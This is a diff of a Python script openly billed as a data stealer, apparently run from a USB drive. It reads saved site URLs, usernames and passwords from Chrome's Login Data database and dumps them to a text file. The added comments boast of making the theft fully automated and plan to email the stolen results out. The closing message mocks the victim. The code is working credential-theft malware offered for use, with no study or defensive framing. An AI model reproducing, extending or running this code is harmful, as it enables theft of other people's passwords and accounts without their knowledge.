@@ -22,6 +22,8 @@ Stealing Ya' Data since 2019
 Remastered by TheStandardPancake, credit to bluedangerforyou for writing the original code
 
 """)
+#essentially I cut out any code that was not necessary, and optimised the file locating methods so that there is no longer any need for manual interaction (now a fully automated process)
+#I alson plan on creating a feature to then email the results so that that as soon as the program is run, that is the end of all you need to do, the data is yours.
 
 #setting up the file to dump info
 usb = os.path.abspath(__file__)
@@ -36,12 +38,6 @@ password_field = "Password: "
 #The magic happens
 f = open(os.path.join(path,"passwordsusers.txt"), "w")
 conn = sqlite3.connect(getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Login Data")
-conn3 = sqlite3.connect(getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/History")
-conn1 = sqlite3.connect(getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Web Data")
-conn4 = sqlite3.connect(getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Web Data")
-cursor3 = conn3.cursor()
-cursor1 = conn1.cursor()
-cursor4 = conn4.cursor()
 cursor = conn.cursor()
 cursor.execute('SELECT action_url, username_value, password_value FROM logins')
 for result in cursor.fetchall():
@@ -50,5 +46,3 @@ for result in cursor.fetchall():
 		f.writelines(siteId + str(result[0]) + '\n' + username1 + str(result[1]) + '\n' + password_field + str(password) + '\n' + '--------------------------------' + '\n')
 f.close()
 print("Congrats, your data is now stolen, LOL!")
-
-input("Press Enter to close the tool")  #this is probably the coolest piece of code here, such a minor way to decrease lines of code, haha and here I am ruining that by disecting it up
